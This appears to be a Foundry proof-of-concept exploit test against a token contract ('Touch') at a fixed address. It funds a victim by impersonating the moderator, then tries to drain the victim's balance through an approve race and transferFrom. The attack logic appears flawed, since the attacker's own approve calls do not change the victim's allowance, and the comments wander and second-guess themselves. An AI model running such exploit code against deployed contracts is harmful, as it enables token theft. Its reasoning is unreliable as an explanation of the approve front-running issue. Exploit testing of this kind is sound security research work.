pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITouch {
    function moderator() external view returns (address);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function unrestricted() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    address private victim;
    ITouch private token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get TST token interface and prepare victim
        token = ITouch(TARGET);

        // Create a victim address with tokens
        victim = makeAddr("victim");

        // Give victim tokens by impersonating the moderator (who has all tokens initially)
        // The moderator is the deployer, which is TARGET itself (since contract creates tokens for msg.sender)
        // Actually, the Touch constructor generates tokens for msg.sender, which would be the deployer.
        // Let's check the moderator address: it's stored in the Moderated base contract.
        // We'll need to get the moderator address first.
        address moderator = token.moderator();

        // Impersonate moderator to transfer tokens to victim
        vm.startPrank(moderator);
        token.transfer(victim, 1000 ether); // Transfer some tokens to victim
        vm.stopPrank();

        // Give attacker some initial tokens as precondition
        deal(address(token), attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        // Step 1: Victim approves attacker for a small amount (simulate victim's intent)
        vm.prank(victim);
        token.approve(attacker, 100 ether);

        // Step 2: Attacker front-runs with approve(0) to reset allowance
        // In real scenario this would be front-run, here we just call it
        token.approve(attacker, 0);

        // Step 3: Attacker approves themselves for a large amount (victim's full balance)
        // This works because allowance is now 0, satisfying the require condition
        uint256 victimBalance = token.balanceOf(victim);
        token.approve(attacker, victimBalance);

        // Step 4: Attacker steals victim's tokens via transferFrom
        // First check current allowance
        uint256 allowance = token.allowance(victim, attacker);
        require(allowance >= victimBalance, "Allowance insufficient");

        // Perform the transferFrom
        token.transferFrom(victim, attacker, victimBalance);

        // Verify attacker's balance increased
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        assertGt(attackerBalanceAfter, 1 ether, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

